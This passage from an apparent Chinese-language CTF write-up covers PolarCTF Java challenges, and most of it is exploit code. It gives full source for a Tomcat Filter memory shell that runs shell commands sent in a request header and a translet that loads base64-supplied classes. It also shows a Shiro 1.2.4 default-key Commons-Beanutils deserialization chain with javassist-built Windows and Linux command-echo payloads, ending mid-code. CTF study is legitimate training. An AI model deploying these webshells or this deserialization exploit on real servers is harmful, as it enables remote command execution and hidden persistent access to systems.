class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;MyClassLoader injection success&quot;</span>);<br>            javax.servlet.http.<span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();<br>            java.lang.reflect.Field r=request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>            r.setAccessible(<span class="hljs-literal">true</span>);<br>            org.apache.catalina.connector.<span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span>((org.apache.catalina.connector.Request) r.get(request)).getResponse();<br>            javax.servlet.http.<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br><br>            String classData=request.getParameter(<span class="hljs-string">&quot;classData&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;classData:&quot;</span>+classData);<br><br>            <span class="hljs-type">byte</span>[] classBytes = Base64.getDecoder().decode(classData);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            defineClassMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, <span class="hljs-number">0</span>,classBytes.length);<br>            cc.newInstance().equals(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;request,response,session&#125;);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM arg0, SerializationHandler[] arg1)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h3><p>implements javax.servlet.Filter起手 重写init() destory() doFilter()</p>
+<p>其中doFilter()是我们命令执行的地方 -&gt; 所有匹配URL的请求都会触发doFilter方法</p>
+<p>equals()将实例化的Filter内存马动态注册到<code>/*</code>路径下 也就是所有路径</p>
+<p>dynamicAddFilter()就是经典Filter内存马注册的步骤 这里面有什么修改tomcat生命周期状态 有待进一步研究</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.util.stream.Collectors;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterMem</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">javax</span>.servlet.Filter&#123;<br>    <span class="hljs-keyword">private</span> javax.servlet.http.<span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> org.apache.catalina.connector.<span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> javax.servlet.http.<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request1, ServletResponse response1, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        javax.servlet.http.<span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (javax.servlet.http.HttpServletRequest)request1;<br>        javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (javax.servlet.http.HttpServletResponse)response1;<br>        javax.servlet.http.<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;Polar-CMD&quot;</span>);<br>        System.out.println(cmd);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;1&quot;</span>);<br>            response.setHeader(<span class="hljs-string">&quot;Polar-START&quot;</span>, <span class="hljs-string">&quot;OK&quot;</span>);<br>            <span class="hljs-comment">// 使用 ProcessBuilder 执行命令</span><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd.split(<span class="hljs-string">&quot;\\s+&quot;</span>))<br>                    .redirectErrorStream(<span class="hljs-literal">true</span>)<br>                    .start();<br>            System.out.println(<span class="hljs-string">&quot;2&quot;</span>);<br>            <span class="hljs-comment">// 获取命令执行的输入流</span><br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br><br>            <span class="hljs-comment">// 使用 Java 8 Stream 将输入流转换为字符串</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream))<br>                    .lines()<br>                    .collect(Collectors.joining(System.lineSeparator()));<br>            System.out.println(<span class="hljs-string">&quot;3&quot;</span>);<br>            response.setHeader(<span class="hljs-string">&quot;Polar-RESULT&quot;</span>,result);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            filterChain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object obj)</span> &#123;<br>        Object[] context=(Object[]) obj;<br>        <span class="hljs-built_in">this</span>.session = (javax.servlet.http.HttpSession ) context[<span class="hljs-number">2</span>];<br>        <span class="hljs-built_in">this</span>.response = (org.apache.catalina.connector.Response) context[<span class="hljs-number">1</span>];<br>        <span class="hljs-built_in">this</span>.request = (javax.servlet.http.HttpServletRequest) context[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">try</span> &#123;<br>            dynamicAddFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMem</span>(),<span class="hljs-string">&quot;Shell&quot;</span>,<span class="hljs-string">&quot;/*&quot;</span>,request);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dynamicAddFilter</span><span class="hljs-params">(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IllegalAccessException &#123;<br>        javax.servlet.ServletContext servletContext=request.getServletContext();<br>        <span class="hljs-keyword">if</span> (servletContext.getFilterRegistration(name) == <span class="hljs-literal">null</span>) &#123;<br>            java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">contextField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            org.apache.catalina.core.<span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br>            org.apache.catalina.core.StandardContext standardContext=<span class="hljs-literal">null</span>;<br>            java.lang.reflect.Field stateField=<span class="hljs-literal">null</span>;<br>            javax.servlet.FilterRegistration.<span class="hljs-type">Dynamic</span> <span class="hljs-variable">filterRegistration</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                contextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>                contextField.setAccessible(<span class="hljs-literal">true</span>);<br>                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);<br>                contextField=applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>                contextField.setAccessible(<span class="hljs-literal">true</span>);<br>                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);<br>                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="hljs-string">&quot;state&quot;</span>);<br>                stateField.setAccessible(<span class="hljs-literal">true</span>);<br>                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);<br>                filterRegistration = servletContext.addFilter(name, filter);<br>                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="hljs-literal">false</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;url&#125;);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">filterStartMethod</span> <span class="hljs-operator">=</span> org.apache.catalina.core.StandardContext.class.getMethod(<span class="hljs-string">&quot;filterStart&quot;</span>);<br>                filterStartMethod.setAccessible(<span class="hljs-literal">true</span>);<br>                filterStartMethod.invoke(standardContext, <span class="hljs-literal">null</span>);<br>                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<span class="hljs-keyword">finally</span> &#123;<br>                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Result-Show"><a href="#Result-Show" class="headerlink" title="Result Show"></a>Result Show</h3><p>本地出现这个报错基本就表示上传成功了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException<br>        at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171) ~[commons-beanutils-1.9.2.jar!/:1.9.2]<br>        at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721) ~[na:1.8.0_65]<br>        at java.util.PriorityQueue.siftDown(PriorityQueue.java:687) ~[na:1.8.0_65]<br>        at java.util.PriorityQueue.heapify(PriorityQueue.java:736) ~[na:1.8.0_65]<br>        at java.util.PriorityQueue.readObject(PriorityQueue.java:795) ~[na:1.8.0_65]<br>        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_65]<br>        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_65]<br>        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_65]<br>        at java.lang.reflect.Method.invoke(Method.java:497) ~[na:1.8.0_65]<br>        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1058) ~[na:1.8.0_65]<br>        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1900) ~[na:1.8.0_65]<br>        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801) ~[na:1.8.0_65]<br>        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351) ~[na:1.8.0_65]<br>        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371) ~[na:1.8.0_65]<br>        at org.example.controller.IndexController.getUser(IndexController.java:33) ~[classes!/:1.0-SNAPSHOT]<br>        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_65]<br>        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_65]<br>        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_65]<br>        at java.lang.reflect.Method.invoke(Method.java:497) ~[na:1.8.0_65]<br></code></pre></td></tr></table></figure>
+<p><img src="/img/polarctf/17442777309844.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="PolarOA"><a href="#PolarOA" class="headerlink" title="PolarOA"></a>PolarOA</h2><p>是shiro key是shiro1.2.4的默认key</p>
+<p>默认shiro1.2.4自带的Commons-beanutils1.8.3 那不妨就打CB链 直接试试上题的EXP</p>
+<p>看了下序列化数据有点长了 直接base64的话就有5984个字符了</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://p0lar1ght.github.io/posts/PolarD&N_CTF_PolarOA/">https://p0lar1ght.github.io/posts/PolarD&amp;N_CTF_PolarOA&#x2F;</a></p>
+<p>出题人说是限制了Cookie长度 要小于3500个字符</p>
+<p>用javassist通过字符串动态加载类会少很多很多字节</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicClassGenerator</span> &#123;<br>    <span class="hljs-keyword">public</span> CtClass <span class="hljs-title function_">genPayloadForWin</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Exp&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public SpringEcho() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            try &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String te = httprequest.getHeader(\&quot;Host\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.addHeader(\&quot;Host\&quot;, te);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String tc = httprequest.getHeader(\&quot;CMD\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                if (tc != null &amp;&amp; !tc.isEmpty()) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    String[] cmd = new String[]&#123;\&quot;cmd.exe\&quot;, \&quot;/c\&quot;, tc&#125;;  \n&quot;</span> +<br>                <span class="hljs-string">&quot;                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &#125; catch (Exception e) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                e.getStackTrace();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br><br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br>    <span class="hljs-keyword">public</span> CtClass <span class="hljs-title function_">genPayloadForLinux</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Exp&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public SpringEcho() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            try &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String te = httprequest.getHeader(\&quot;Host\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.addHeader(\&quot;Host\&quot;, te);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String tc = httprequest.getHeader(\&quot;CMD\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;                if (tc != null &amp;&amp; !tc.isEmpty()) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    String[] cmd =  new String[]&#123;\&quot;/bin/sh\&quot;, \&quot;-c\&quot;, tc&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br><br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这里的思路是直接给要加载的类提供一个构造函数 之后需要直接实例化调用就行</p>
+<p>大概就分下面几步</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取默认类池 只有加载在这个ClassPool中的类才能使用</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-comment">// 在默认类池中新建一个名为Exp的类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Exp&quot;</span>);<br><span class="hljs-comment">// addConstructor接受一个CtConstructor 创建该类的构造函数</span><br>clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;...&quot;</span>));<br><span class="hljs-comment">// 获取这个类需要的父类 这里是恶意类加载 所以是父类是AbstractTranslet</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br><span class="hljs-comment">// 设置父类后return clazz即可</span><br>clazz.setSuperclass(superClass);<br></code></pre></td></tr></table></figure>
+<p>在设定构造函数的时候要注意调用路径都得用绝对路径 至于设置父类为什么不用override了 这里算是一个待解决的点 先留个坑</p>
+<p>之后就是正常CB链的构造 正好有个javassist.CtClass::toBytecode() 可以直接生成字节码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-comment">//shiro无依赖利用链，使用shiro1.2.4自带的cb 1.8.3</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">polar</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        com.sun.org.apache.xalan.internal.xsltc.trax.<span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> getTemplate();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br>        <span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>      